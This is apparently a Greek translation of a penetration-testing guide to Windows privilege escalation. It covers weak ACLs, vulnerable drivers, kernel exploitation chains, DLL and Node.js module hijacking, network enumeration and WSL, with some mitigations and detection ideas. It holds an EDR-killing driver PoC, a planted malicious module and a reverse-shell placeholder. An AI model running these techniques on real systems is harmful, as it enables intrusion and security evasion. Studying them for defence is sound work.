#### Ταυτότητα self-hosted agent του Azure Pipelines

Για ένα project του Azure DevOps Server ή του Azure Pipelines, διαχωρίστε το δικαίωμα **δημιουργίας ή επεξεργασίας** ενός pipeline από το δικαίωμα **τοποθέτησής του στην ουρά** και χρήσης του επιλεγμένου agent pool· η [Microsoft τεκμηριώνει ανεξάρτητα τα δικαιώματα pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) και την [εξουσιοδότηση pool](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Αν ένας λογαριασμός με λιγότερα δικαιώματα μπορεί να υποβάλει ένα βήμα script και να εκτελέσει αυτό το pipeline σε self-hosted Windows agent, το βήμα εκτελείται ως ο [ρυθμισμένος λογαριασμός λειτουργικού συστήματος του agent](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Επιβεβαιώστε το ακριβές pipeline, τους περιορισμούς branch/resource, το εξουσιοδοτημένο pool, την εκτελέσιμη εργασία και την ταυτότητα της υπηρεσίας agent πριν ισχυριστείτε μετάβαση μεταξύ χρηστών ή σε SYSTEM. Ένας εγκατεστημένος agent, ένας ρόλος project ή δικαίωμα εγγραφής σε repository αποτελούν μόνο ενδείξεις προς διερεύνηση· ελέγξτε τα δικαιώματα και τα τοπικά metadata της υπηρεσίας χωρίς να ξεκινήσετε build κατά την παθητική απαρίθμηση.

#### Διαπιστευτήρια του Microsoft Entra Connect Sync

Η [Microsoft διακρίνει](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) τον **λογαριασμό υπηρεσίας ADSync**, ο οποίος εκτελεί την υπηρεσία συγχρονισμού και έχει πρόσβαση στη βάση δεδομένων SQL, από τον **λογαριασμό σύνδεσης AD DS**, του οποίου τα δικαιώματα καταλόγου εξαρτώνται από τις ρυθμισμένες δυνατότητες συγχρονισμού. Τα διαπιστευτήρια σύνδεσης αποθηκεύονται κρυπτογραφημένα σε αυτήν τη βάση δεδομένων, ενώ το υλικό κλειδιών [προστατεύεται από το DPAPI στο πλαίσιο του λογαριασμού υπηρεσίας ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Μια εγκατεστημένη υπηρεσία συγχρονισμού, μια ομάδα με όνομα που υποδηλώνει τοπικό διαχειριστή ή η απλή ορατότητα της βάσης δεδομένων δεν αποδεικνύουν από μόνα τους ότι υπάρχουν αποκρυπτογραφήσιμα διαπιστευτήρια ή δυνατότητα κλιμάκωσης δικαιωμάτων στον domain. Ελέγξτε χωριστά τα πραγματικά δικαιώματα ανάγνωσης στη βάση δεδομένων, την πρόσβαση στον λογαριασμό υπηρεσίας και στα κλειδιά, τη διάταξη εγκατάστασης και SQL, την ταυτότητα σύνδεσης που έχει ρυθμιστεί και τα πραγματικά δικαιώματα AD αυτής της ταυτότητας. Η συνήθης απαρίθμηση πρέπει να εμφανίζει μόνο metadata υπηρεσίας και πρόσβασης, όχι να ανακτά ή να εμφανίζει τα αποθηκευμένα μυστικά.

#### Δικαιώματα support DLL του printer driver

Ένας εγκατεστημένος printer driver μπορεί να διατηρεί support DLLs στο `C:\ProgramData` και να τα φορτώνει σε μια διεργασία εκτύπωσης με υψηλότερα δικαιώματα. Ελέγξτε τα ACL του ακριβούς καταλόγου driver και των DLL, συμπεριλαμβανομένων των γονικών καταλόγων και των reparse points, ακόμη κι αν δεν επιτρέπεται η απαρίθμηση μέσω printer WMI. Για το [πρόβλημα printer driver της Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), η αναφερόμενη διαδρομή ήταν `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`· η [αρχική δημοσίευση](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) περιγράφει φόρτωση DLL από το `PrintIsolationHost.exe`. Ένα ACL που επιτρέπει εγγραφή αποτελεί μόνο ένδειξη προς διερεύνηση: επιβεβαιώστε την πραγματική δυνατότητα εγγραφής μετά την εφαρμογή των deny entries, ότι ο σχετικός driver είναι εγκατεστημένος και φορτώνει το αρχείο με προνομιακή ταυτότητα, καθώς και αν η ενημερωμένη έκδοση του driver ή το πρόγραμμα ασφαλείας του προμηθευτή έχει διορθώσει την εγκατάσταση. Μην συμπεραίνετε ότι υπάρχει ευπάθεια μόνο από το όνομα του καταλόγου ή την έκδοση του driver.

### Δικαιώματα εγγραφής

Ελέγξτε αν μπορείτε να τροποποιήσετε κάποιο αρχείο ρυθμίσεων ώστε να διαβάσετε κάποιο ειδικό αρχείο ή αν μπορείτε να τροποποιήσετε κάποιο binary που πρόκειται να εκτελεστεί από λογαριασμό Administrator (schedtasks).

Ένας τρόπος να εντοπίσετε αδύναμα δικαιώματα σε φακέλους/αρχεία του συστήματος είναι να εκτελέσετε:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Persistence/εκτέλεση μέσω αυτόματης φόρτωσης plugin του Notepad++

Το Notepad++ φορτώνει αυτόματα κάθε DLL plugin στους υποφακέλους `plugins`. Αν υπάρχει εγκατάσταση portable/αντίγραφο με δυνατότητα εγγραφής, η προσθήκη ενός κακόβουλου plugin εκτελεί αυτόματα κώδικα μέσα στο `notepad++.exe` σε κάθε εκκίνηση (συμπεριλαμβανομένων των `DllMain` και των callbacks του plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Εκτέλεση κατά την εκκίνηση

**Ελέγξτε αν μπορείτε να αντικαταστήσετε κάποιο registry ή binary που πρόκειται να εκτελεστεί από διαφορετικό χρήστη.**\
**Διαβάστε** την **παρακάτω σελίδα** για να μάθετε περισσότερα σχετικά με ενδιαφέρουσες **θέσεις autoruns για κλιμάκωση προνομίων**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Αναζητήστε πιθανούς **περίεργους/ευάλωτους drivers τρίτων κατασκευαστών**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Αν ένας driver εκθέτει ένα primitive αυθαίρετης ανάγνωσης/εγγραφής στον kernel (συνηθισμένο σε κακοσχεδιασμένους IOCTL handlers), μπορείτε να κλιμακώσετε τα προνόμιά σας κλέβοντας απευθείας ένα SYSTEM token από τη μνήμη του kernel.<sup>[[13]](#references)</sup> Δείτε εδώ την τεχνική βήμα προς βήμα:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Για bugs τύπου race condition, όπου η ευάλωτη κλήση ανοίγει ένα attacker-controlled μονοπάτι Object Manager, μπορείτε να επιμηκύνετε σκόπιμα την αναζήτηση (χρησιμοποιώντας components μέγιστου μήκους ή βαθιές αλυσίδες καταλόγων), επεκτείνοντας το χρονικό παράθυρο από μικροδευτερόλεπτα σε δεκάδες μικροδευτερόλεπτα:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### UAF σε cancel-safe queues, disclosures από paged pool και pivots μέσω I/O ring

Ορισμένες αλυσίδες LPE στον Windows kernel μπορούν να προκύψουν από δύο bugs που είναι αδύναμα μεμονωμένα: ένα **race στη διάρκεια ζωής μιας cancel-safe queue**, που απελευθερώνει ένα request/CBD ενώ το lock της queue παραμένει κλειδωμένο, και ένα disclosure τύπου **lock-release-before-copy**, που διαρρέει μια απελευθερωμένη paged-pool allocation κατά τη διάρκεια του `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Σημειώσεις για audit και exploitation:

- **Free-under-lock + cancel afterwards**: αναζητήστε μια success path που εκτελεί **Acquire -> CompleteRequest/free -> Release**, ενώ η cancel path εκτελεί **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Αν η success path φτάσει στο `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` πριν απελευθερώσει το lock του CBDQ/CSQ, ένα thread που έχει μπλοκαριστεί στο `NtCancelIoFileEx -> IopCsqCancelRoutine` μπορεί να συνεχίσει αργότερα και να περάσει ένα απελευθερωμένο `PFLT_CALLBACK_DATA` πίσω στο remove callback του driver.
- **Ανακτήστε το απελευθερωμένο queue object** με μια attacker-controlled paged-pool allocation ίδιου μεγέθους. Τα `NPFS` Data Queue Entries είναι χρήσιμα, επειδή το payload και το μέγεθος είναι ελεγχόμενα και μπορείτε αργότερα να τα ελέγξετε με pipe read/peek operations. Αν το απελευθερωμένο object ενσωματώνει list links, αντικαταστήστε τα με μια **κυκλική λίστα από fake request nodes στη user memory**, ώστε ο driver να επεξεργάζεται επανειλημμένα request structures που ορίζετε εσείς, αντί να τερματίζει στην αρχική κεφαλή της λίστας.
- **Αναβαθμίστε μια προβλέψιμη εγγραφή**: αν το fake request ανακατευθύνει έναν nested context pointer που χρησιμοποιείται για εγγραφές bookkeeping (timestamps / QPC / πεδία κοντά στο refcount), μπορεί να πετύχετε μια εγγραφή kernel με **ελεγχόμενη διεύθυνση αλλά όχι ελεγχόμενη τιμή**. Σε αυτή την περίπτωση, στοχεύστε το πεδίο **length/size** ενός sprayed pool object αντί για έναν τελικό code/data pointer και, στη συνέχεια, ελέγξτε διαδοχικά τα objects του spray μέχρι το αλλοιωμένο object να επιτρέψει ανάγνωση paged pool εκτός ορίων.
- **Μοτίβο disclosure με race condition**: οποιοδήποτε syscall εκτελεί `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` είναι ισχυρός υποψήφιος. Η αξιοπιστία βελτιώνεται όταν ο attacker μπορεί να αυξήσει το μέγεθος του buffer που αντιγράφεται (για παράδειγμα, προσθέτοντας πολλές list/resource entries που αυξάνουν το τελικό μέγεθος allocation ενός serializer), επειδή η μεγαλύτερη διάρκεια της αντιγραφής διευρύνει το παράθυρο αντικατάστασης χωρίς απαραίτητα να προκαλεί crash στο σύστημα.
- **Στόχοι refill με πολλούς pointers**: οι registered-buffer arrays του Windows **I/O ring** είναι εξαιρετικοί στόχοι disclosure, επειδή το μέγεθος paged pool τους ελέγχεται από τον attacker (`8 * regBufferCnt`) και κάθε στοιχείο είναι ένας kernel pointer προς ένα `_IOP_MC_BUFFER_ENTRY`. Διαρρεύστε έναν από αυτούς τους arrays, ανακτήστε το περιβάλλον `IORING_OBJECT` και, στη συνέχεια, αλλοιώστε τα **`RegBuffers`** και **`RegBuffersCount`**, ώστε οι επόμενες I/O ring operations να χρησιμοποιούν entries που έχει κατασκευάσει ο attacker και να παρέχουν αυθαίρετη ανάγνωση/εγγραφή στον kernel. Αν η μόνη διαθέσιμη εγγραφή σάς δίνει μια σταθερή τιμή byte (για παράδειγμα, από το `KUSER_SHARED_DATA+0x14`), χρησιμοποιήστε **επικαλυπτόμενες μη ευθυγραμμισμένες εγγραφές** για να δημιουργήσετε έναν user pointer με επαναλαμβανόμενα bytes, όπως το `0x0101010101010101`, αντιστοιχίστε τον με `VirtualAlloc` και τοποθετήστε εκεί τον forged registered-buffer array.<sup>[[30]](#references)</sup>

Χρήσιμες ενδείξεις για debugging:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Μόλις αποκτήσετε arbitrary kernel read/write από το corrupted I/O ring, κλέψτε ένα SYSTEM token ακολουθώντας την τυπική post-primitive διαδικασία:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives αλλοίωσης μνήμης για registry hives

Οι σύγχρονες ευπάθειες hive επιτρέπουν τη διαμόρφωση ντετερμινιστικών διατάξεων μνήμης, την κατάχρηση εγγράψιμων απογόνων των HKLM/HKU και τη μετατροπή της αλλοίωσης μεταδεδομένων σε υπερχειλίσεις του kernel paged pool, χωρίς custom driver. Μάθετε ολόκληρη την αλυσίδα εδώ:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Σύγχυση τύπων σε direct mode του `RtlQueryRegistryValues` με paths ελεγχόμενα από τον εισβολέα

Ορισμένοι drivers δέχονται ένα registry path από το userland, ελέγχουν μόνο ότι είναι έγκυρη συμβολοσειρά UTF-16 και κατόπιν καλούν το `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` με `RTL_QUERY_REGISTRY_DIRECT` προς μια scalar μεταβλητή στη στοίβα, όπως η `int readValue`. Αν λείπει το `RTL_QUERY_REGISTRY_TYPECHECK`, το `EntryContext` ερμηνεύεται με βάση τον **πραγματικό** τύπο του registry και όχι τον τύπο που αναμένει ο developer.

Αυτό δημιουργεί δύο χρήσιμα primitives:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: ένα απόλυτο path `\Registry\...` ελεγχόμενο από τον χρήστη επιτρέπει στον driver να ερωτά keys που επιλέγει ο εισβολέας, να διαρρέει την ύπαρξή τους μέσω κωδικών επιστροφής/logs και, ορισμένες φορές, να διαβάζει τιμές στις οποίες ο caller δεν θα είχε άμεση πρόσβαση.
- **Αλλοίωση μνήμης kernel**: ένας προορισμός scalar, όπως το `&readValue`, μπορεί να ερμηνευτεί με λανθασμένο τύπο ως `REG_QWORD`, `UNICODE_STRING` ή buffer δυαδικών δεδομένων συγκεκριμένου μεγέθους, ανάλογα με τον τύπο της τιμής του registry.

Σημειώσεις για πρακτική εκμετάλλευση:

- **Μείωση κινδύνου στα Windows 8+**: αν το query στοχεύσει ένα **untrusted hive** με `RTL_QUERY_REGISTRY_DIRECT`, αλλά χωρίς `RTL_QUERY_REGISTRY_TYPECHECK`, οι κλήσεις από τον kernel προκαλούν crash με `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Για να παραμείνει εκμεταλλεύσιμο, αναζητήστε **keys εγγράψιμα από τον εισβολέα μέσα σε trusted system hives**, αντί να τοποθετείτε τιμές στο `HKCU`.
- **Προετοιμασία σε trusted hive**: χρησιμοποιήστε το NtObjectManager για να απαριθμήσετε εγγράψιμους απογόνους του `\Registry\Machine` και εκτελέστε ξανά τη σάρωση με duplicated token **low-integrity**, για να εντοπίσετε keys προσβάσιμα από sandboxed περιβάλλοντα:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: μια άμεση εγγραφή 8 byte σε ένα `int` 4 byte καταστρέφει γειτονικά δεδομένα της στοίβας και μπορεί να αντικαταστήσει μερικώς έναν κοντινό δείκτη callback/συνάρτησης.
- **`REG_SZ` / `REG_EXPAND_SZ`**: η άμεση λειτουργία απαιτεί το `EntryContext` να δείχνει σε ένα `UNICODE_STRING`. Αν ο κώδικας φορτώσει πρώτα ένα `REG_DWORD` ελεγχόμενο από τον attacker σε μια βαθμωτή μεταβλητή της στοίβας και έπειτα επαναχρησιμοποιήσει το ίδιο buffer για ανάγνωση συμβολοσειράς, ο attacker ελέγχει τα `Length`/`MaximumLength` και επηρεάζει μερικώς τον δείκτη `Buffer`, προκαλώντας μια μερικώς ελεγχόμενη εγγραφή στον kernel.
- **`REG_BINARY`**: για μεγάλα δυαδικά δεδομένα, η άμεση λειτουργία αντιμετωπίζει το πρώτο `LONG` στο `EntryContext` ως μέγεθος buffer με πρόσημο. Αν μια προηγούμενη ανάγνωση `REG_DWORD` αφήσει μια **αρνητική** τιμή που ελέγχει ο attacker στη βαθμωτή μεταβλητή που επαναχρησιμοποιείται, το επόμενο ερώτημα `REG_BINARY` αντιγράφει τα bytes του attacker απευθείας πάνω από γειτονικές θέσεις της στοίβας, κάτι που συχνά αποτελεί τον πιο καθαρό τρόπο για πλήρη αντικατάσταση δείκτη callback.

Ισχυρό μοτίβο για αναζήτηση: **ετερογενείς αναγνώσεις registry στην ίδια μεταβλητή της στοίβας, χωρίς επανεκκίνησή της**. Κάντε grep για `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, επαναχρησιμοποιούμενους δείκτες `EntryContext` και διαδρομές κώδικα όπου η πρώτη ανάγνωση registry καθορίζει αν θα γίνει δεύτερη ανάγνωση.

#### Εκμετάλλευση της απουσίας του FILE_DEVICE_SECURE_OPEN σε αντικείμενα συσκευών (LPE + τερματισμός EDR)

Ορισμένοι υπογεγραμμένοι drivers τρίτων δημιουργούν το αντικείμενο συσκευής τους με ισχυρό SDDL μέσω του IoCreateDeviceSecure, αλλά παραλείπουν να ορίσουν το FILE_DEVICE_SECURE_OPEN στο DeviceCharacteristics. Χωρίς αυτή τη σημαία, η ασφαλής DACL δεν επιβάλλεται όταν η συσκευή ανοίγεται μέσω διαδρομής που περιέχει ένα επιπλέον στοιχείο, επιτρέποντας σε οποιονδήποτε μη προνομιούχο χρήστη να αποκτήσει handle χρησιμοποιώντας μια διαδρομή namespace όπως:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (από πραγματικό περιστατικό)

Μόλις ένας χρήστης μπορέσει να ανοίξει τη συσκευή, τα προνομιούχα IOCTL που εκθέτει ο driver μπορούν να αξιοποιηθούν για LPE και παραποίηση. Παραδείγματα δυνατοτήτων που έχουν παρατηρηθεί στην πράξη:
- Επιστροφή handles πλήρους πρόσβασης σε αυθαίρετες διεργασίες (κλοπή token / κέλυφος SYSTEM μέσω DuplicateTokenEx/CreateProcessAsUser).
- Απεριόριστη ανάγνωση/εγγραφή raw disk (παραποίηση εκτός σύνδεσης, τεχνάσματα persistence κατά την εκκίνηση).
- Τερματισμός αυθαίρετων διεργασιών, συμπεριλαμβανομένων των Protected Process/Light (PP/PPL), επιτρέποντας τον τερματισμό AV/EDR από user land μέσω του kernel.

Ελάχιστο μοτίβο PoC (λειτουργία χρήστη):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigations για developers
- Να ορίζετε πάντα το FILE_DEVICE_SECURE_OPEN κατά τη δημιουργία device objects που προορίζονται να περιορίζονται από DACL.
- Να επικυρώνετε το context του caller για privileged operations. Να προσθέτετε ελέγχους PP/PPL πριν επιτρέψετε τον τερματισμό διεργασιών ή την επιστροφή handles.
- Να περιορίζετε τα IOCTLs (access masks, METHOD_*, επικύρωση εισόδου) και να εξετάζετε brokered models αντί για άμεσα kernel privileges.

Ιδέες ανίχνευσης για defenders
- Να παρακολουθείτε ανοίγματα ύποπτων device names από user mode (π.χ., \\ .\\amsdk*) και συγκεκριμένες ακολουθίες IOCTL που υποδηλώνουν κατάχρηση.
- Να επιβάλλετε το vulnerable driver blocklist της Microsoft (HVCI/WDAC/Smart App Control) και να διατηρείτε δικές σας λίστες allow/deny.


## PATH DLL Hijacking

Αν έχετε **δικαιώματα εγγραφής σε έναν φάκελο που περιλαμβάνεται στο PATH**, ενδέχεται να μπορείτε να κάνετε hijack ένα DLL που φορτώνεται από μια διεργασία και να **κλιμακώσετε τα προνόμιά σας**.<sup>[[2]](#references)</sup>

Ελέγξτε τα δικαιώματα όλων των φακέλων μέσα στο PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Για περισσότερες πληροφορίες σχετικά με τον τρόπο κατάχρησης αυτού του ελέγχου:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking μέσω του `C:\node_modules`

Πρόκειται για μια παραλλαγή του **Windows uncontrolled search path**, η οποία επηρεάζει εφαρμογές **Node.js** και **Electron** όταν εκτελούν ένα bare import, όπως `require("foo")`, και η αναμενόμενη ενότητα **λείπει**.<sup>[[20]](#references)</sup>

Το Node αναζητά πακέτα ανεβαίνοντας στην ιεραρχία καταλόγων και ελέγχοντας τους φακέλους `node_modules` κάθε γονικού καταλόγου. Στα Windows, αυτή η αναζήτηση μπορεί να φτάσει στη ρίζα της μονάδας δίσκου. Έτσι, μια εφαρμογή που εκκινείται από το `C:\Users\Administrator\project\app.js` μπορεί να αναζητήσει:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Αν ένας **χρήστης με χαμηλά προνόμια** μπορεί να δημιουργήσει το `C:\node_modules`, μπορεί να τοποθετήσει εκεί ένα κακόβουλο `foo.js` (ή έναν φάκελο πακέτου) και να περιμένει μέχρι μια διεργασία **Node/Electron με υψηλότερα προνόμια** να προσπαθήσει να επιλύσει την εξάρτηση που λείπει. Το payload εκτελείται στο πλαίσιο ασφαλείας της διεργασίας-θύματος, επομένως αυτό οδηγεί σε **LPE** όταν ο στόχος εκτελείται ως administrator, από μια προγραμματισμένη εργασία με αυξημένα προνόμια/ένα service wrapper ή από μια εφαρμογή επιφάνειας εργασίας με αυξημένα προνόμια που εκκινείται αυτόματα.

Αυτό συμβαίνει ιδιαίτερα συχνά όταν:

- μια εξάρτηση δηλώνεται στο `optionalDependencies`<sup>[[22]](#references)</sup>
- μια βιβλιοθήκη τρίτου μέρους περικλείει το `require("foo")` σε `try/catch` και συνεχίζει σε περίπτωση αποτυχίας
- ένα πακέτο αφαιρέθηκε από τα production builds, παραλείφθηκε κατά τη συσκευασία ή δεν εγκαταστάθηκε
- το ευάλωτο `require()` βρίσκεται βαθιά στο δέντρο εξαρτήσεων αντί στον κύριο κώδικα της εφαρμογής

### Εντοπισμός ευάλωτων στόχων

Χρησιμοποιήστε το **Procmon** για να επιβεβαιώσετε τη διαδρομή επίλυσης:<sup>[[23]](#references)</sup>

- Φιλτράρετε με `Process Name` = το εκτελέσιμο αρχείο-στόχος (`node.exe`, το EXE της εφαρμογής Electron ή η διεργασία wrapper)
- Φιλτράρετε με `Path` `contains` `node_modules`
- Εστιάστε στα `NAME NOT FOUND` και στο τελευταίο επιτυχές άνοιγμα κάτω από το `C:\node_modules`

Χρήσιμα μοτίβα για αναζήτηση στον κώδικα, σε αποσυσκευασμένα αρχεία `.asar` ή στον πηγαίο κώδικα της εφαρμογής:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Εντοπίστε το **όνομα του πακέτου που λείπει** μέσω του Procmon ή εξετάζοντας τον πηγαίο κώδικα.
2. Δημιουργήστε τον ριζικό κατάλογο αναζήτησης, αν δεν υπάρχει ήδη:

```powershell
mkdir C:\node_modules
```

3. Τοποθετήστε ένα module με το ακριβώς αναμενόμενο όνομα:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Ενεργοποιήστε την εφαρμογή-θύμα. Αν η εφαρμογή επιχειρήσει `require("foo")` και το νόμιμο module δεν υπάρχει, το Node μπορεί να φορτώσει το `C:\node_modules\foo.js`.

Πραγματικά παραδείγματα ελλειπόντων προαιρετικών modules που ταιριάζουν σε αυτό το μοτίβο είναι τα `bluebird` και `utf-8-validate`, αλλά το **technique** είναι το επαναχρησιμοποιήσιμο στοιχείο: εντοπίστε οποιοδήποτε **missing bare import** το οποίο θα επιλύσει μια προνομιούχα διεργασία Windows Node/Electron.

### Ιδέες για ανίχνευση και ενίσχυση ασφάλειας

- Ειδοποιήστε όταν ένας χρήστης δημιουργεί το `C:\node_modules` ή γράφει εκεί νέα αρχεία/πακέτα `.js`.
- Αναζητήστε διεργασίες υψηλής ακεραιότητας που διαβάζουν από το `C:\node_modules\*`.
- Συμπεριλάβετε όλες τις εξαρτήσεις χρόνου εκτέλεσης στα production builds και ελέγξτε τη χρήση του `optionalDependencies`.
- Εξετάστε κώδικα τρίτων για μοτίβα σιωπηρής διαχείρισης σφαλμάτων `try { require("...") } catch {}`.
- Απενεργοποιήστε τους προαιρετικούς ελέγχους όταν το υποστηρίζει η βιβλιοθήκη (για παράδειγμα, ορισμένες εγκαταστάσεις του `ws` μπορούν να παραλείψουν τον παλιό έλεγχο `utf-8-validate` με `WS_NO_UTF_8_VALIDATE=1`).

## Δίκτυο

### Κοινόχρηστοι πόροι

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### αρχείο hosts

Ελέγξτε το αρχείο hosts για άλλους γνωστούς υπολογιστές με hardcoded καταχωρίσεις.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Διεπαφές δικτύου & DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Ανοιχτές θύρες

Ελέγξτε από έξω για **υπηρεσίες με περιορισμένη πρόσβαση**.

```bash
netstat -ano #Opened ports?
```

Για έναν local listener, συσχετίστε το PID του με τον κάτοχο της διεργασίας, τη διαδρομή του εκτελέσιμου αρχείου και οποιαδήποτε υπηρεσία ή προγραμματισμένη εργασία τον εκκινεί. Μια υπηρεσία remote control μπορεί να παρέχει πρόσβαση ως ο χρήστης της επιφάνειας εργασίας μόνο αν το επιτρέπουν οι μηχανισμοί ελέγχου ταυτότητας και οι περιορισμοί εντολών της. Μια προσαρμοσμένη εφαρμογή TCP που εκτελείται με λογαριασμό υψηλότερων προνομίων αποτελεί ξεχωριστό στόχο διερεύνησης: ο listener και η διαδρομή του εκτελέσιμου αρχείου είναι παθητικές ενδείξεις, ενώ μια διαδρομή εκμετάλλευσης memory corruption που απαιτεί έλεγχο ταυτότητας προϋποθέτει ανάλυση του συγκεκριμένου εκτελέσιμου αρχείου και των εισόδων στις οποίες έχει πρόσβαση. Αν μια εκτεθειμένη θύρα φαίνεται να ανήκει σε διεργασία συστήματος, συγκρίνετέ την με την εντολή [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) προτού αποδώσετε την υπηρεσία backend· ένας κανόνας προώθησης από μόνος του δεν αποδεικνύει ότι ο προορισμός είναι προσβάσιμος ή ευάλωτος.

### Πίνακας δρομολόγησης

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Πίνακας ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Κανόνες Firewall

[**Ελέγξτε αυτή τη σελίδα για εντολές σχετικές με το Firewall**](../basic-cmd-for-pentesters.md#firewall) **(λίστα κανόνων, δημιουργία κανόνων, απενεργοποίηση, απενεργοποίηση...)**

Περισσότερες [εντολές για network enumeration εδώ](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Το δυαδικό αρχείο `bash.exe` μπορεί επίσης να βρίσκεται στο `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Αν αποκτήσετε δικαιώματα root, μπορείτε να ακούτε σε οποιαδήποτε θύρα (την πρώτη φορά που θα χρησιμοποιήσετε το `nc.exe` για να ακούσετε σε μια θύρα, θα εμφανιστεί ένα GUI που θα σας ρωτά αν πρέπει να επιτραπεί στο `nc` η πρόσβαση μέσω του firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Για να εκκινήσετε εύκολα το bash ως root, μπορείτε να δοκιμάσετε το `--default-user root`

Μπορείτε να εξερευνήσετε το σύστημα αρχείων του `WSL` στον φάκελο `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

